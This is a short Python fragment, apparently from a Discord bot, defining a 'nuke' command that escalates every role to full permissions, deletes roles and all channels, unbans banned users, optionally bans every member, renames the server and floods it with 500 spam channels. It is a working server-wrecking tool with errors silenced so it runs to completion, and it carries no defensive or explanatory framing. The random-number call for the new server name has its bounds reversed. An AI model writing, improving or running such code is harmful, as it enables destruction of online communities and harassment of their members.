@bot.command(name='nuke')
async def nuke(ctx):
    await bot.change_presence(activity=discord.Game(f'Nuking {ctx.guild}'), status=discord.Status.dnd)
    if rolenuke == True:
        for role in ctx.guild.roles:
            try:
                await role.edit(permissions = discord.Permissions.all())
                await role.delete()
            except:
                pass
    else:
        for role in ctx.guild.roles:
            try:
                await role.edit(permissions = discord.Permissions.all())
            except:
                pass
    bans = await ctx.guild.bans()
    for ban in bans:
        try:
            await ctx.guild.unban(ban)
        except:
            pass
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    if memberban == True:
        for member in ctx.guild.members:
            try:
                await member.ban()
            except:
                pass
    else:
        pass
    await ctx.guild.edit(name=f'{random.randint(9387827387, 8234889273489307)}')
    for x in range(500):
        await ctx.guild.create_text_channel(name=random.choice(channelname))
